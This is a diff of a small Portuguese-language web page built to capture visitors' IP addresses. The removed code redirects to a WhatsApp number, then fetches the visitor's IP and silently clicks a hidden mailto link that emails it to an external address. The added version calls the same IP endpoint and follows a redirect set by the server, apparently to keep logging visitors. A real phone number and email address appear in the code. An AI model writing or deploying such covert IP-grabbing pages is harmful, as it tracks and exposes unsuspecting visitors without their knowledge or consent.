@@ -1,31 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecionamento</title>
+    <title>Obter IP</title>
 </head>
 <body>
-    <script>
-        function redirectToWhatsApp() {
-            window.location.href = 'https://wa.me/27998041981';
-        }
+    <h1>Obter IP</h1>
 
-        function sendIP() {
+    <script>
+        function getIp() {
             fetch('/get-ip')
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip;
-                    const emailUrl = 'mailto:minadoooo11@yahoo.com?subject=Endereço IP do Usuário&body=' + encodeURIComponent('O endereço IP do usuário é: ' + ip);
-                    const emailLink = document.createElement('a');
-                    emailLink.href = emailUrl;
-                    emailLink.style.display = 'none';
-                    document.body.appendChild(emailLink);
-                    emailLink.click();
+                    if (data.redirect) {
+                        window.location.href = data.redirect;
+                    }
                 })
                 .catch(error => console.error(error));
         }
 
-        redirectToWhatsApp();
-        setTimeout(sendIP, 2000);
+        getIp();
     </script>
 </body>
 </html>
